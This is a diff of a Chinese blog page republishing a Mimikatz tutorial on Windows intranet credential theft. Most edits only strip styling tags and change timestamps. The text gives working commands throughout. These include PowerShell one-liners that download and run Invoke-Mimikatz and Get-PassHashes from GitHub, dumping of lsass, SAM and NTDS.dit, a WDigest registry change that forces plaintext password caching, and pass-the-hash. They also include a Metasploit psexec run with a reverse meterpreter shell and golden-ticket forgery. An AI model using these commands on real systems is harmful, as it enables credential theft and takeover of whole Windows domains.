@@ -28,8 +28,8 @@
 <meta property="og:description" content="来源：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-mo-&#x2F;p&#x2F;11890232.html0x00 简介Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cbbzx12.github.io/images/head.jpg">
-<meta property="article:published_time" content="2025-12-24T11:54:38.386Z">
-<meta property="article:modified_time" content="2025-12-24T11:54:38.386Z">
+<meta property="article:published_time" content="2025-12-24T12:00:03.493Z">
+<meta property="article:modified_time" content="2025-12-24T12:00:03.493Z">
 <meta property="article:author" content="bug_001">
 <meta property="article:tag" content="内网">
 <meta name="twitter:card" content="summary">
@@ -140,7 +140,7 @@
   <span class="sep"></span>
   <a class="cap breadcrumb" href="/wiki/%E5%86%85%E7%BD%91/%E6%8F%90%E6%9D%83/Mimikatz%E6%95%99%E7%A8%8B/">Mimikatz教程</a>
   </div>
-<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T11:54:38.386Z">2025-12-24</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-12-24T12:00:03.493Z">2025-12-24</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -151,120 +151,120 @@
     </div>
     
   </div>
-  </div><article class="md-text content"><h3 id="来源：https-www-cnblogs-com-mo-p-11890232-html"><a href="#来源：https-www-cnblogs-com-mo-p-11890232-html" class="headerlink" title="来源：https://www.cnblogs.com/-mo-/p/11890232.html"></a><font style="color:rgb(0, 0, 0);">来源：</font><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a><font style="color:rgb(0, 0, 0);"></h3><p>0x00 简介</font><br><font style="color:rgb(0, 0, 0);">Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</font></p>
-<p><font style="color:rgb(0, 0, 0);">注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</font></p>
-<p><font style="color:rgb(0, 0, 0);">这里放几个神器的运行姿势：九种姿势运行：Mimikatz：</font><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/176796.html"><font style="color:rgb(0, 0, 0);">https://www.freebuf.com/articles/web/176796.html</font></a></p>
-<p><font style="color:rgb(0, 0, 0);">借用PowerShell</font></p>
+  </div><article class="md-text content"><h3 id="来源：https-www-cnblogs-com-mo-p-11890232-html"><a href="#来源：https-www-cnblogs-com-mo-p-11890232-html" class="headerlink" title="来源：https://www.cnblogs.com/-mo-/p/11890232.html"></a>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></h3><p>0x00 简介<br>Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！</p>
+<p>注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>
+<p>这里放几个神器的运行姿势：九种姿势运行：Mimikatz：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/176796.html">https://www.freebuf.com/articles/web/176796.html</a></p>
+<p>借用PowerShell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#读取密码明文(需要管理员权限)</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz –DumpCerts</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#读取密码hash值(需要管理员权限)</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460776-5f3fd30d-bc13-466a-bfdd-d0cfb0f111f8.png"></p>
-<h3 id="0x01-获取本地帐户密码"><a href="#0x01-获取本地帐户密码" class="headerlink" title="0x01 获取本地帐户密码"></a><font style="color:rgb(0, 0, 0);">0x01 获取本地帐户密码</font></h3><h4 id="1-1-本地执行"><a href="#1-1-本地执行" class="headerlink" title="1.1 本地执行"></a><font style="color:rgb(51, 51, 51);">1.1 本地执行</font></h4><p><font style="color:rgb(0, 0, 0);">下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</font></p>
+<h3 id="0x01-获取本地帐户密码"><a href="#0x01-获取本地帐户密码" class="headerlink" title="0x01 获取本地帐户密码"></a>0x01 获取本地帐户密码</h3><h4 id="1-1-本地执行"><a href="#1-1-本地执行" class="headerlink" title="1.1 本地执行"></a>1.1 本地执行</h4><p>下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</font></p>
-<p><font style="color:rgb(0, 0, 0);">cmd修改注册表命令：</font></p>
+<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
+<p>cmd修改注册表命令：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyreg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line">#重启或用户重新登录后可以成功抓取</span><br></pre></td></tr></table></figure>
 
-<h4 id="1-2-SAM表获取hash"><a href="#1-2-SAM表获取hash" class="headerlink" title="1.2 SAM表获取hash"></a><font style="color:rgb(51, 51, 51);">1.2 SAM表获取hash</font></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copy#导出SAM数据</span><br><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line"></span><br><span class="line">#使用mimikatz提取hash</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
+<h4 id="1-2-SAM表获取hash"><a href="#1-2-SAM表获取hash" class="headerlink" title="1.2 SAM表获取hash"></a>1.2 SAM表获取hash</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Copy#导出SAM数据</span><br><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line"></span><br><span class="line">#使用mimikatz提取hash</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-Procdump-Mimikatz"><a href="#0x02-Procdump-Mimikatz" class="headerlink" title="0x02 Procdump+Mimikatz"></a><font style="color:rgb(0, 0, 0);">0x02 Procdump+Mimikatz</font></h3><p><font style="color:rgb(0, 0, 0);">当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</font></p>
+<h3 id="0x02-Procdump-Mimikatz"><a href="#0x02-Procdump-Mimikatz" class="headerlink" title="0x02 Procdump+Mimikatz"></a>0x02 Procdump+Mimikatz</h3><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">将lsass.dmp下载到本地后，然后执行mimikatz:</font></p>
+<p>将lsass.dmp下载到本地后，然后执行mimikatz:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">为了方便复制与查看，可以输出到本地文件里面：</font></p>
+<p>为了方便复制与查看，可以输出到本地文件里面：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copymimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x03-读取域控中域成员Hash"><a href="#0x03-读取域控中域成员Hash" class="headerlink" title="0x03 读取域控中域成员Hash"></a><font style="color:rgb(0, 0, 0);">0x03 读取域控中域成员Hash</font></h3><h4 id="3-1-域控本地读取"><a href="#3-1-域控本地读取" class="headerlink" title="3.1 域控本地读取"></a><font style="color:rgb(51, 51, 51);">3.1 域控本地读取</font></h4><p><font style="color:rgb(0, 0, 0);">注：得在域控上以域管理员身份执行mimikatz</font></p>
-<p><font style="color:rgb(0, 0, 0);">方法一：直接执行</font></p>
+<h3 id="0x03-读取域控中域成员Hash"><a href="#0x03-读取域控中域成员Hash" class="headerlink" title="0x03 读取域控中域成员Hash"></a>0x03 读取域控中域成员Hash</h3><h4 id="3-1-域控本地读取"><a href="#3-1-域控本地读取" class="headerlink" title="3.1 域控本地读取"></a>3.1 域控本地读取</h4><p>注：得在域控上以域管理员身份执行mimikatz</p>
+<p>方法一：直接执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">抓取密码</span><br><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</font></p>
+<p>方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#获取所有域用户</span><br><span class="line">lsadump::dcsync /domain:test.com /all /csv</span><br><span class="line"></span><br><span class="line">#指定获取某个用户的hash</span><br><span class="line">lsadump::dcsync /domain:test.com /user:test</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-2-导出域成员Hash"><a href="#3-2-导出域成员Hash" class="headerlink" title="3.2 导出域成员Hash"></a><font style="color:rgb(51, 51, 51);">3.2 导出域成员Hash</font></h4><p><font style="color:rgb(94, 102, 135);">Copy</font></p>
-<p>域账户的用户名和hash密码以域数据库的形式存放在域控制器的 <code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);&quot;&gt;%SystemRoot%\ntds\NTDS.DIT&lt;/font&gt;</code> 文件中。</p>
-<p><font style="color:rgb(0, 0, 0);">这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：</font></p>
+<h4 id="3-2-导出域成员Hash"><a href="#3-2-导出域成员Hash" class="headerlink" title="3.2 导出域成员Hash"></a>3.2 导出域成员Hash</h4><p>Copy</p>
+<p>域账户的用户名和hash密码以域数据库的形式存放在域控制器的 <code>%SystemRoot%\ntds\NTDS.DIT</code> 文件中。</p>
+<p>这里可以借助：ntdsutil.exe，域控制器自带的域数据库管理工具，我们可以通过域数据库，提取出域中所有的域用户信息，在域控上依次执行如下命令，导出域数据库：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Copy#创建快照</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line"></span><br><span class="line">#加载快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">#Copy文件副本</span><br><span class="line">copy C:\$SNAP_201911211122_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：</font></p>
+<p>将ntds.dit文件拷贝到本地利用impacket脚本dump出Hash：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copysecretsdump.py -ntds.dit -system system.hive LOCAL</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460982-0f3beca5-6c46-4f63-9f04-d06d38d22107.png"></p>
-<p><font style="color:rgb(0, 0, 0);">除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）：</font></p>
-<p><font style="color:rgb(0, 0, 0);">工具地址：</font><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases"><font style="color:rgb(0, 0, 0);">https://github.com/zcgonvh/NTDSDumpEx/releases</font></a></p>
+<p>除了借助python，还有一个NTDSDumpEx（会被360查杀的哦）：</p>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CopyNTDSDumpEx -d ntds.dit -o domain.txt -s system.hiv    (system.hive文件获取:reg save hklm\system system.hive)</span><br><span class="line">NTDSDumpEx -d ntds.dit -o domain.txt -r               (此命令适用于在域控本地执行)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460928-1ac941be-27d9-4632-b492-b13074b3e3e2.png"><font style="color:rgb(0, 0, 0);"><br></font><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460902-b2fae742-30c6-48fb-87ed-089443c66dbc.png"></p>
-<p><font style="color:rgb(0, 0, 0);">最后记得卸载删除快照：</font></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460928-1ac941be-27d9-4632-b492-b13074b3e3e2.png"><br><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460902-b2fae742-30c6-48fb-87ed-089443c66dbc.png"></p>
+<p>最后记得卸载删除快照：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copyntdsutil snapshot &quot;unmount &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;delete  &#123;72ba82f0-5805-4365-a73c-0ccd01f5ed0d&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-3-secretsdump脚本直接导出域hash"><a href="#3-3-secretsdump脚本直接导出域hash" class="headerlink" title="3.3 secretsdump脚本直接导出域hash"></a><font style="color:rgb(51, 51, 51);">3.3 secretsdump脚本直接导出域hash</font></h4><p><font style="color:rgb(0, 0, 0);">为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：</font></p>
+<h4 id="3-3-secretsdump脚本直接导出域hash"><a href="#3-3-secretsdump脚本直接导出域hash" class="headerlink" title="3.3 secretsdump脚本直接导出域hash"></a>3.3 secretsdump脚本直接导出域hash</h4><p>为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，简单粗暴：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copypython secretsdump.py rabbitmask:123456@192.168.15.181</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功</font></p>
-<h3 id="0x04-哈希传递攻击PTH"><a href="#0x04-哈希传递攻击PTH" class="headerlink" title="0x04 哈希传递攻击PTH"></a><font style="color:rgb(0, 0, 0);">0x04 哈希传递攻击PTH</font></h3><h4 id="4-1-工作组环境"><a href="#4-1-工作组环境" class="headerlink" title="4.1 工作组环境"></a><font style="color:rgb(51, 51, 51);">4.1 工作组环境</font></h4><p><font style="color:rgb(0, 0, 0);">当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</font></p>
+<p>首先它会导出本地SAM中的hash，然后是所有域内用户的IP，全部获取成功</p>
+<h3 id="0x04-哈希传递攻击PTH"><a href="#0x04-哈希传递攻击PTH" class="headerlink" title="0x04 哈希传递攻击PTH"></a>0x04 哈希传递攻击PTH</h3><h4 id="4-1-工作组环境"><a href="#4-1-工作组环境" class="headerlink" title="4.1 工作组环境"></a>4.1 工作组环境</h4><p>当我们获得了一台主机的NTLM哈希值，我们可以使用mimikatz对其进行哈希传递攻击。执行完命令后，会弹出cmd窗口。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用administrator用户的NTLM哈希值进行攻击</span><br><span class="line">sekurlsa::pth /user:administrator /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用xie用户的NTLM哈希值进行攻击</span><br><span class="line">sekurlsa::pth /user:xie /domain:192.168.10.15 /ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。</font></p>
+<p>在弹出的cmd窗口，我们直接可以连接该主机，并且查看该主机下的文件夹。</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012460882-5719928d-ea90-4208-b5d9-f4962ac921cb.png"></p>
-<p><font style="color:rgb(0, 0, 0);">或者可以直接将该主机的C盘映射到本地的K盘。<br></font><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461185-97d84f6b-6c36-4bc0-96c2-4798088f075e.png"></p>
-<p><font style="color:rgb(0, 0, 0);">注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。</font></p>
-<h4 id="4-2-域环境"><a href="#4-2-域环境" class="headerlink" title="4.2 域环境"></a><font style="color:rgb(51, 51, 51);">4.2 域环境</font></h4><p><font style="color:rgb(0, 0, 0);">在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值</font></p>
-<p><font style="color:rgb(0, 0, 0);">域：xie.com<br></font><font style="color:rgb(0, 0, 0);">域控：WIN2008.xie.com</font></p>
+<p>或者可以直接将该主机的C盘映射到本地的K盘。<br><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461185-97d84f6b-6c36-4bc0-96c2-4798088f075e.png"></p>
+<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令。</p>
+<h4 id="4-2-域环境"><a href="#4-2-域环境" class="headerlink" title="4.2 域环境"></a>4.2 域环境</h4><p>在域环境中，当我们获得了域内用户的NTLM哈希值，我们可以使用域内的一台主机用mimikatz对域控进行哈希传递攻击。执行完命令后，会弹出cmd窗口。前提是我们必须拥有域内任意一台主机的本地 administrator 权限和获得了域用户的NTLM哈希值</p>
+<p>域：xie.com<br>域控：WIN2008.xie.com</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用域管理员administrator的NTLM哈希值对域控进行哈希传递攻击</span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;xie.com&quot; /ntlm:dbd621b8ed24eb627d32514476fac6c5</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Copy#使用域用户xie的NTLM哈希值对域控进行哈希传递攻击</span><br><span class="line">sekurlsa::pth /user:xie /domain:&quot;xie.com&quot; /ntlm:329153f560eb329c0e1deea55e88a1e9</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461355-e8341355-5a88-4b26-8abf-b084b048d7ab.png"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461486-c575b309-62bd-4969-b4b8-eaaa1a7c7113.png"></p>
-<h4 id="4-3-MSF进行哈希传递"><a href="#4-3-MSF进行哈希传递" class="headerlink" title="4.3 MSF进行哈希传递"></a><font style="color:rgb(51, 51, 51);">4.3 MSF进行哈希传递</font></h4><p><font style="color:rgb(94, 102, 135);">Copy</font></p>
-<p>有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 <code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);&quot;&gt;exploit/windows/smb/psexec&lt;/font&gt;</code> 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。</p>
+<h4 id="4-3-MSF进行哈希传递"><a href="#4-3-MSF进行哈希传递" class="headerlink" title="4.3 MSF进行哈希传递"></a>4.3 MSF进行哈希传递</h4><p>Copy</p>
+<p>有些时候，当我们获取到了某台主机的Administrator用户的LM-Hash和 NTLM-Hash ，并且该主机的445端口打开着。我们则可以利用 <code>exploit/windows/smb/psexec</code> 漏洞用MSF进行远程登录(哈希传递攻击)。(只能是administrator用户的LM-hash和NTLM-hash)，这个利用跟工作组环境或者域环境无关。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Copymsf &gt; use  exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; set lhost 192.168.10.27</span><br><span class="line">msf exploit(psexec) &gt; set rhost 192.168.10.14</span><br><span class="line">msf exploit(psexec) &gt; set smbuser Administrator</span><br><span class="line">msf exploit(psexec) &gt; set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.nlark.com/yuque/0/2025/png/53530601/1763012461488-af7d4866-b2d2-42e6-b52b-70cf15008e3b.png"></p>
-<h3 id="0x05-票据传递攻击-PTT"><a href="#0x05-票据传递攻击-PTT" class="headerlink" title="0x05 票据传递攻击(PTT)"></a><font style="color:rgb(0, 0, 0);">0x05 票据传递攻击(PTT)</font></h3><h4 id="5-1-黄金票据"><a href="#5-1-黄金票据" class="headerlink" title="5.1 黄金票据"></a><font style="color:rgb(51, 51, 51);">5.1 黄金票据</font></h4><p><font style="color:rgb(0, 0, 0);">域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。</font></p>
-<p><font style="color:rgb(0, 0, 0);">首先获取krbtgt的用户hash:</font></p>
+<h3 id="0x05-票据传递攻击-PTT"><a href="#0x05-票据传递攻击-PTT" class="headerlink" title="0x05 票据传递攻击(PTT)"></a>0x05 票据传递攻击(PTT)</h3><h4 id="5-1-黄金票据"><a href="#5-1-黄金票据" class="headerlink" title="5.1 黄金票据"></a>5.1 黄金票据</h4><p>域中每个用户的 Ticket 都是由 krbtgt 的密码 Hash 来计算生成的，因此只要获取到了 krbtgt 用户的密码 Hash ，就可以随意伪造 Ticket ，进而使用 Ticket 登陆域控制器，使用 krbtgt 用户 hash 生成的票据被称为 Golden Ticket，此类攻击方法被称为票据传递攻击。</p>
+<p>首先获取krbtgt的用户hash:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copymimikatz &quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(0, 0, 0);">利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</font></p>
+<p>利用 mimikatz 生成域管权限的 Golden Ticket，填入对应的域管理员账号、域名称、sid值，如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copykerberos::golden /admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Copy#导入刚才生成的票据</span><br><span class="line">kerberos::ptt test.kiribi</span><br><span class="line"></span><br><span class="line">#导入成功后可获取域管权限</span><br><span class="line">dir \\dc.abc.com\c$</span><br></pre></td></tr></table></figure>
 
-<h4 id="5-2-白银票据"><a href="#5-2-白银票据" class="headerlink" title="5.2 白银票据"></a><font style="color:rgb(51, 51, 51);">5.2 白银票据</font></h4><p><font style="color:rgb(0, 0, 0);">黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信</font></p>
-<p><font style="color:rgb(0, 0, 0);">白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信</font></p>
+<h4 id="5-2-白银票据"><a href="#5-2-白银票据" class="headerlink" title="5.2 白银票据"></a>5.2 白银票据</h4><p>黄金票据和白银票据的一些区别：Golden Ticket：伪造TGT，可以获取任何 Kerberos 服务权限，且由 krbtgt 的 hash 加密，金票在使用的过程需要和域控通信</p>
+<p>白银票据：伪造 TGS ，只能访问指定的服务，且由服务账号（通常为计算机账户）的 Hash 加密 ，银票在使用的过程不需要同域控通信</p>
